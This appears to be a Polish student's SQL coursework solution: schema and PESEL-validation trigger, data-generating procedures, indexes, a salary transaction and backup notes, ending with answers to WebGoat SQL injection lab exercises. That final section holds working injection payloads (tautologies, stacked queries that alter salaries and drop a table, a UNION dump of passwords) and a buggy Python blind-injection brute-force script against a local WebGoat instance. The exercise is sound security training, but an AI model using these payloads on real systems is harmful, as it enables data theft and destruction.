--1.
CREATE DATABASE db_lista3;
--Ustawianie PESElu jako klucza nie jest dobrym pomyslem,poniewaz jest on unikatowy lecz niektore osoby moga nie miec peselu.
CREATE TABLE Ludzie( ID int NOT NULL AUTO_INCREMENT,
PESEL char(11),
imie varchar(30),
nazwisko varchar(30),
data_urodzenia date,
plec enum('K','M'),
PRIMARY KEY(ID)
);
--Trigger sprawdzajacy czy podany pesel jest poprawny
DELIMITER $$
	CREATE TRIGGER checkPeselTrigger BEFORE INSERT ON Ludzie
    FOR EACH ROW
	BEGIN
        IF YEAR(NEW.data_urodzenia)%100>=10 AND CAST(YEAR(NEW.data_urodzenia)%100 AS CHAR)<>LEFT(NEW.PESEL,2)THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF YEAR(NEW.data_urodzenia)%100<10 AND CONCAT('0',CAST(YEAR(NEW.data_urodzenia)%100 AS CHAR))<>LEFT(NEW.PESEL,2)THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF MONTH(NEW.data_urodzenia)>=10 AND YEAR(NEW.data_urodzenia)>=2000 AND  CONCAT('3' , CAST(RIGHT(MONTH(NEW.data_urodzenia),1) AS CHAR))<>SUBSTRING(NEW.PESEL,3,2)THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF MONTH(NEW.data_urodzenia)>=10 AND YEAR(NEW.data_urodzenia)<2000 AND  CAST(MONTH(NEW.data_urodzenia) AS CHAR)<>SUBSTRING(NEW.PESEL,3,2)THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF MONTH(NEW.data_urodzenia)<10 AND YEAR(NEW.data_urodzenia) >= 2000 AND CONCAT( '2' , CAST(MONTH(NEW.data_urodzenia) AS CHAR))<>SUBSTRING(NEW.PESEL,3,2) THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF MONTH(NEW.data_urodzenia)<10 AND YEAR(NEW.data_urodzenia) < 2000 AND CONCAT( '0' , CAST(MONTH(NEW.data_urodzenia) AS CHAR))<>SUBSTRING(NEW.PESEL,3,2)  THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF DAY(NEW.data_urodzenia)>=10 AND CAST(DAY(NEW.data_urodzenia) AS CHAR)<>SUBSTRING(NEW.PESEL,5,2) THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF DAY(NEW.data_urodzenia)<10 AND CONCAT('0',CAST(DAY(NEW.data_urodzenia) AS CHAR))<>SUBSTRING(NEW.PESEL,5,2) THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF NEW.plec='K' AND CAST(LEFT(SUBSTRING(NEW.PESEL,10,1),1) AS INTEGER) % 2 = 1 THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF NEW.plec='M' AND CAST(LEFT(SUBSTRING(NEW.PESEL,10,1),1) AS INTEGER) % 2 = 0 THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel'; END IF;
        IF CAST((CAST(LEFT(NEW.PESEL,1) AS int)+CAST(LEFT(SUBSTRING(NEW.PESEL, 2, 1),1) AS int)*3+CAST(LEFT(SUBSTRING(NEW.PESEL, 3, 1),1) AS int)*7+CAST(LEFT(SUBSTRING(NEW.PESEL,4, 1),1 )AS int)*9+
        CAST(LEFT(SUBSTRING(NEW.PESEL, 5, 1),1 )AS int) +CAST(LEFT(SUBSTRING(NEW.PESEL, 6, 1),1) AS int)*3+CAST(LEFT(SUBSTRING(NEW.PESEL,7, 1),1) AS int)*7
        +CAST(LEFT(SUBSTRING(NEW.PESEL, 8, 1),1) AS int)*9+CAST(LEFT(SUBSTRING(NEW.PESEL, 9, 1 ),1) AS int)+CAST(LEFT(SUBSTRING(NEW.PESEL, 10, 1),1 )AS int)*3)%10 AS CHAR)<>RIGHT(NEW.PESEL,1) THEN SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'Niepoprawny pesel';
        END IF;
    END $$
DELIMITER ; 

--tworzenie tabeli Zawody
CREATE TABLE Zawody ( zawod_id int NOT NULL AUTO_INCREMENT,
nazwa varchar(50),
pensja_min float CHECK(pensja_min>=0),
pensja_max float CHECK(pensja_max>=0),
PRIMARY KEY(zawod_id),
CONSTRAINT pensjaCNST CHECK(pensja_min<pensja_max)
);

--Tworzenie tabeli Pracownicy
CREATE TABLE Pracownicy (ID int,
zawod_id int,
pensja float CHECK(pensja>=0),
FOREIGN KEY(ID) REFERENCES Ludzie(ID) ON DELETE CASCADE,
FOREIGN KEY(zawod_id) REFERENCES Zawody(zawod_id) ON DELETE CASCADE
);

--procedura generujaca losowe osoby z podanego przedzialu wiekowego
DELIMITER $$
CREATE PROCEDURE InsertRandomPeople(max_wiek int, min_wiek int, ilosc int)
BEGIN
    DECLARE cnt INTEGER;
    DECLARE newPlec TYPE OF Ludzie.plec;
    DECLARE newDate date;
    DECLARE min_data date;
    DECLARE max_data date;
    DECLARE newImie TYPE OF Ludzie.imie;
    DECLARE newNazwisko TYPE OF Ludzie.nazwisko;
    DECLARE newPes TYPE OF Ludzie.PESEL;
    SET cnt = 0;
    SET min_data = ADD_MONTHS(CURDATE(), -12*min_wiek);
    SET max_data = ADD_MONTHS(CURDATE(), -12*max_wiek);
    WHILE cnt<ilosc DO
        IF cnt % 2 = 1 THEN SET newPlec ='K'; END IF;
        IF cnt % 2 = 0 THEN SET newPlec ='M'; END IF;
        IF cnt % 12 = 0 THEN SET newImie = 'Marcin'; END IF;
        IF cnt % 12 = 1 THEN SET newImie = 'Ania';END IF;
        IF cnt % 12 = 2 THEN SET newImie = 'Karol';END IF;
        IF cnt % 12 = 3 THEN SET newImie = 'Kasia';END IF;
        IF cnt % 12 = 4 THEN SET newImie = 'Damian';END IF;
        IF cnt % 12 = 5 THEN SET newImie = 'Basia';END IF;
        IF cnt % 12 = 6 THEN SET newImie = 'Wlodzimierz';END IF;
        IF cnt % 12 = 7 THEN SET newImie = 'Natalia';END IF;
        IF cnt % 12 = 8 THEN SET newImie = 'Patryk';END IF;
        IF cnt % 12 = 9 THEN SET newImie = 'Karolina';END IF;
        IF cnt % 12 = 10 THEN SET newImie = 'Bartek';END IF;
        IF cnt % 12 = 11 THEN SET newImie = 'Patrycja';END IF;
        IF cnt % 7 = 0 THEN SET newNazwisko = 'Klamka';END IF;
        IF cnt % 7 = 1 THEN SET newNazwisko = 'Nowak';END IF;
        IF cnt % 7 = 2 THEN SET newNazwisko = 'Wozniak';END IF;
        IF cnt % 7 = 3 THEN SET newNazwisko = 'Kasprzyk';END IF;
        IF cnt % 7 = 4 THEN SET newNazwisko = 'Musial';END IF;
        IF cnt % 7 = 5 THEN SET newNazwisko = 'Kot';END IF;
        IF cnt % 7 = 6 THEN SET newNazwisko = 'Zemetro';END IF;
        SET newDate = DATE_ADD(max_data, INTERVAL RAND() * DATEDIFF(min_data,max_data) DAY);
        IF YEAR(newDate)%100 >=10 THEN SET newPes = CAST(YEAR(newDate)%100 AS CHAR); END IF;
        IF YEAR(newDate)%100 <10 THEN SET newPes = CONCAT('0',CAST(YEAR(newDate)%100 AS CHAR)); END IF;

        IF MONTH(newDate) >= 10 THEN
            IF YEAR(newDate) >= 2000 THEN
                SET newPes = CONCAT(newPes ,'3' , CAST(RIGHT(MONTH(newDate),1) AS CHAR));
            END IF;
            IF YEAR(newDate) < 2000 THEN
                SET newPes = CONCAT(newPes , CAST(MONTH(newDate) AS CHAR));
            END IF;
        END IF;
        IF MONTH(newDate) < 10 THEN
            IF YEAR(newDate) >= 2000 THEN
                SET newPes = CONCAT(newPes , '2' , CAST(MONTH(newDate) AS CHAR));
            END IF;
            IF YEAR(newDate) < 2000 THEN
                SET newPes = CONCAT(newPes , '0' , CAST(MONTH(newDate) AS CHAR));
            END IF;
        END IF;

        IF DAY(newDate) >= 10 THEN
            SET newPes = CONCAT(newPes , CAST(DAY(newDate) AS CHAR));
        END IF;
        IF DAY(newDate) < 10 THEN
            SET newPes = CONCAT(newPes , '0' ,CAST(DAY(newDate) AS CHAR));
        END IF;

        SET newPes = CONCAT(newPes , FLOOR(RAND()*9 + 1),FLOOR(RAND()*9 + 1),FLOOR(RAND()*9 + 1));
        IF newPlec = 'K' THEN
            IF cnt % 5 = 0 THEN
                SET newPes = CONCAT(newPes , '0');
            END IF;
            IF cnt % 5 = 1 THEN
                SET newPes = CONCAT(newPes , '2');
            END IF;
            IF cnt % 5 = 2 THEN
                SET newPes = CONCAT(newPes , '4');
            END IF;
            IF cnt % 5 = 3 THEN
                SET newPes = CONCAT(newPes , '6');
            END IF;
            IF cnt % 5 = 4 THEN
                SET newPes = CONCAT(newPes , '8');
            END IF;
        END IF;
        IF newPlec = 'M' THEN
            IF cnt % 5 = 0 THEN
                SET newPes = CONCAT(newPes , '1');
            END IF;
            IF cnt % 5 = 1 THEN
                SET newPes = CONCAT(newPes , '3');
            END IF;
            IF cnt % 5 = 2 THEN
                SET newPes = CONCAT(newPes , '5');
            END IF;
            IF cnt % 5 = 3 THEN
                SET newPes = CONCAT(newPes , '7');
            END IF;
            IF cnt % 5 = 4 THEN
                SET newPes = CONCAT(newPes , '9');
            END IF;
        END IF;
        SET newPes = CONCAT(newPes , CAST((CAST(LEFT(newPes,1) AS int)+CAST(LEFT(SUBSTRING(newPes, 2, 1),1) AS int)*3+CAST(LEFT(SUBSTRING(newPes, 3, 1),1) AS int)*7+CAST(LEFT(SUBSTRING(newPes,4, 1),1 )AS int)*9+
        CAST(LEFT(SUBSTRING(newPes, 5, 1),1 )AS int) +CAST(LEFT(SUBSTRING(newPes, 6, 1),1) AS int)*3+CAST(LEFT(SUBSTRING(newPes,7, 1),1) AS int)*7
        +CAST(LEFT(SUBSTRING(newPes, 8, 1),1) AS int)*9+CAST(LEFT(SUBSTRING(newPes, 9, 1 ),1) AS int)+CAST(LEFT(SUBSTRING(newPes, 10, 1),1 )AS int)*3)%10 AS CHAR));
        INSERT INTO Ludzie (PESEL,imie, nazwisko, data_urodzenia,plec) VALUES ((newPes),(newImie),(newNazwisko),(newDate),(newPlec));
        SET cnt = cnt + 1;
	END WHILE;
END $$
DELIMITER ;

--Tworzenie rekordow w Ludzie za pomoca procedury InsertRandomPeople
CALL InsertRandomPeople(17,0,5);
CALL InsertRandomPeople(59,18,45);
CALL InsertRandomPeople(99,60,5);

--Tworzenie rekordow w Zawody
INSERT INTO Zawody(nazwa,pensja_min,pensja_max) VALUES('polityk',5000,20000),('nauczyciel',2000,5000),('lekarz',4200,15000),('informatyk',4000,20000);

--Procedura uzupelniajaca tabele Pracownicy osobami ktore nie sa jeszcze zatrudnione uzywajac kursora
DELIMITER $$
CREATE PROCEDURE HireAllUnemployed()
BEGIN
    DECLARE done INTEGER DEFAULT FALSE;
    DECLARE wiek INTEGER;
    DECLARE pid INTEGER;
    DECLARE p TYPE OF Ludzie.Plec;
    DECLARE newZawod INTEGER;
    DECLARE newPensja INTEGER;
    DECLARE LudzieCount CURSOR FOR(SELECT ID, FLOOR(DATEDIFF(CURDATE(),data_urodzenia)/365) AS WIEK, plec FROM Ludzie WHERE ID NOT IN(SELECT ID FROM Pracownicy) AND FLOOR(DATEDIFF(CURDATE(),data_urodzenia)/365)>=18);
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
    OPEN LudzieCount;
        read_loop: LOOP
            FETCH LudzieCount INTO pid,wiek,p;
            IF done THEN
                LEAVE read_loop;
            END IF;
            IF wiek>60 AND p='K' THEN
                SET newZawod=(SELECT zawod_id FROM Zawody WHERE nazwa<>'lekarz' ORDER BY RAND() LIMIT 1);
                SET newPensja=(SELECT RAND()*((SELECT pensja_max FROM Zawody WHERE zawod_id=newZawod)-(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod))+(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod));
                INSERT INTO Pracownicy(ID, zawod_id, pensja) VALUES (pid,newZawod,newPensja);
            END IF;
            IF wiek>65 AND p='M' THEN
                SET newZawod=(SELECT zawod_id FROM Zawody WHERE nazwa<>'lekarz' ORDER BY RAND() LIMIT 1);
                SET newPensja=(SELECT RAND()*((SELECT pensja_max FROM Zawody WHERE zawod_id=newZawod)-(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod))+(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod));
                INSERT INTO Pracownicy(ID, zawod_id, pensja) VALUES (pid,newZawod,newPensja);
            END IF;
            IF wiek<=65 AND p='M' THEN
                SET newZawod=(SELECT zawod_id FROM Zawody ORDER BY RAND() LIMIT 1);
                SET newPensja=(SELECT RAND()*((SELECT pensja_max FROM Zawody WHERE zawod_id=newZawod)-(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod))+(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod));
                INSERT INTO Pracownicy(ID, zawod_id, pensja) VALUES (pid,newZawod,newPensja);
            END IF;
            IF wiek<=60 AND p='K' THEN
                SET newZawod=(SELECT zawod_id FROM Zawody ORDER BY RAND() LIMIT 1);
                SET newPensja=(SELECT RAND()*((SELECT pensja_max FROM Zawody WHERE zawod_id=newZawod)-(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod))+(SELECT pensja_min FROM Zawody WHERE zawod_id=newZawod));
                INSERT INTO Pracownicy(ID, zawod_id, pensja) VALUES (pid,newZawod,newPensja);
            END IF;
        END LOOP;
    CLOSE LudzieCount;
END$$
DELIMITER ;

--Tworzenie rekordow w Pracownicy dla wszystkich niezatrudnionych pelnoletnich osob
CALL HireAllUnemployed();

--2.
CREATE INDEX LudzieIDX USING BTREE ON Ludzie(imie,plec);
CREATE INDEX PracownicyIDX USING BTREE ON Pracownicy(pensja);

SELECT * FROM Ludzie WHERE imie LIKE 'A%' AND plec='K'; --z1
SELECT * FROM Ludzie WHERE plec='K'; --z2
SELECT * FROM Ludzie WHERE imie LIKE 'K%'; --z3
SELECT L.ID,imie,nazwisko,plec,pensja,nazwa AS nazwa_zawodu FROM Ludzie L JOIN Pracownicy P ON L.ID=P.ID JOIN Zawody Z ON P.zawod_id=Z.zawod_id WHERE pensja<2000; --z4
SELECT L.ID,imie,nazwisko,plec,pensja,nazwa AS nazwa_zawodu FROM Ludzie L JOIN Pracownicy P ON L.ID=P.ID JOIN Zawody Z ON P.zawod_id=Z.zawod_id WHERE pensja>10000 AND nazwa='informatyk' AND plec='M'; --z5

--Obecne indexy zalozone dla Tabeli Ludzie to wyzej stworzony index LudzieIDX oraz Index typu BTREE dla kolumny ID czyli klucza wlasnego. Obecne indexy zalozone dla tabeli Pracownicy to PracownicyIDX oraz INDEXY 
--dla kluczy obcych zawod_id oraz ID.
--Optymalizator uzywa indexow dla zapytan numer 1(LudzieIDX), 4(PracownicyIDX) i 5(PracownicyIDX).(w 3 LudzieIDX jako possible_key). 

--3.
DELIMITER $$
CREATE PROCEDURE SalaryIncrease(job varchar(50))
BEGIN
    DECLARE done INTEGER DEFAULT FALSE;
    DECLARE maxSalary INTEGER;
    DECLARE newSalary float;
    DECLARE pid INTEGER;
    DECLARE PracownicyCount CURSOR FOR(SELECT ID,pensja FROM Pracownicy P JOIN Zawody Z ON P.zawod_id=Z.zawod_id WHERE Z.nazwa=job);
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
    SET maxSalary = (SELECT pensja_max FROM Zawody WHERE nazwa=job);
    SET autocommit = 0;
    START TRANSACTION;
    OPEN PracownicyCount;
        read_loop: LOOP
            FETCH PracownicyCount INTO pid,newSalary;
            IF done THEN
                LEAVE read_loop;
            END IF;
            SET newSalary = newSalary * 1.05;
            IF newSalary>maxSalary THEN 
                ROLLBACK; 
                LEAVE read_loop; 
            END IF;
            UPDATE Pracownicy SET pensja=newSalary WHERE ID=pid;
        END LOOP;
    CLOSE PracownicyCount;
    COMMIT;
END$$
DELIMITER ;

--4.
PREPARE zapytanie FROM "SELECT COUNT(P.ID) AS Liczba_kobiet FROM Pracownicy P JOIN Zawody Z ON P.zawod_id=Z.zawod_id JOIN Ludzie L ON P.ID=L.ID WHERE L.plec='K' AND Z.nazwa=?";
--przykladowe wywolanie
EXECUTE zapytanie USING 'lekarz';

--5.
--Tworzenie backupu za pomoca  mysqldump
--($>mysqldump -u root -p  db_lista3 > dbbackup.sql)
DROP DATABASE db_lista3;

--Przywracanie bazy danych.
CREATE DATABASE db_lista3;
--($>mysql -u root -p db_lista3 < dbbackup.sql)

--Backup calosciowy kopiuje wszystkie dane ze zrodla co zajmuje duzo czasu ale pozwala na bardzo szybkie odzyskanie danych. Backup roznicowy przechowuje roznice miedzy wersjami plikow zamiast calych plikow. Backup
--roznicowy wywoluje sie od backupu calosciowego i zapisuje tylko zmiany ktore zaszly w plikach od pierwszego pelnego backupu.Do odzyskiwania danych potrzben sa dane z backupu pelnego i roznicowego.

--6.1
--ZADANIA Z SQL INJECTION (intro)
--strona2
--odp: SELECT department FROM Employees WHERE first_name='Bob' AND last_name='Franco';
--strona3
--odp: UPDATE Employees SET department='Sales' WHERE first_name='Tobi' AND last_name='Barnett';
--strona4
--odp: ALTER TABLE Employees ADD phone varchar(20);
--strona5
--odp: GRANT ALL ON grant_rights TO unauthorized_user;
--strona 9
--odp: SELECT * FROM user_data WHERE first_name='John' AND last_name='Smith' or '1'='1';
--strona 10
--odp: SELECT * From user_data WHERE Login_Count = 1 and userid= 0 OR TRUE;
--strona 11
--odp: SELECT * FROM employees WHERE last_name = 'K' AND auth_tan = 'K' OR '1'='1';
--strona 12
--odp: K'; UPDATE Employees SET salary=99999 WHERE first_name='John' AND last_name='Smith'; SELECT * FROM Employees WHERE first_name='E  wyplata zostala zmieniona mozna uzyc poprawnych danych aby to sprawdzic
--strona 13
--odp: k';DROP TABLE access_log;SELECT * FROM Employees WHERE last_name='   

--6.2
--ZADANIA Z SQL INJECTION (advanced)
--strona 3
--SELECT * FROM user_data WHERE last_name = 'K'; SELECT * FROM user_system_data WHERE '1'='1' . Haslo Dave'a to passW0rD.
--metoda 2: SELECT * FROM user_data WHERE last_name = 'k' UNION SELECT userid, password, password, password, user_name, cookie, userid FROM user_system_data WHERE '1'='1'
--strona 5
--W zakladce register mozemy za pomoca wpisywania: tom' AND SUBSTRING(password, n, 1)='?  odgadnac n-te literki hasla Toma wpisujac zamiast ? dowolne litery alfabetu.
--Jezeli wpisana literka jest n-ta literka hasla wtedy otrzymamy od strony komunikat 'User {0} already exists...'. Najlepiej napisac skrypt ktory odgaduje literki metoda brute force.
--Haslo toma to: thisisasecretfortomonly

--reczna proba odgadniecia hasla bedzie wymagalaby 306 prob
--przykladowy skrypt w python
/*import json
import request

def sql_injection(json_tag):
	letter_index=0
	letters=string.ascii_lowercase
	pass_index=0
	password=""
	headers= { 'Cookie': json_tag}

	while True:
		load = f"tom' AND substring(password,{pass_index},1)='{letters[letter_index]}"
		dane = {
			'username_reg': load,
			'email_reg': 'a@b.c',
			'password_reg': 'a',
			'confirm_password_reg': 'a'
		}
		r=requests.put('https://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',headers=headers,data=dane)
		try:
			response = json.loads(r.text)
		except:
        	print("Zle ID")
			return
		if "aready exists" not in response['feedback']:
			letter_index+=1
		else:
			password += letters[letter_index]
			print(password)
			letter_index=0
			password_index+=1


sql_injection('')
*/

--strona6
--opdowiedzi: D, C, B, C, D
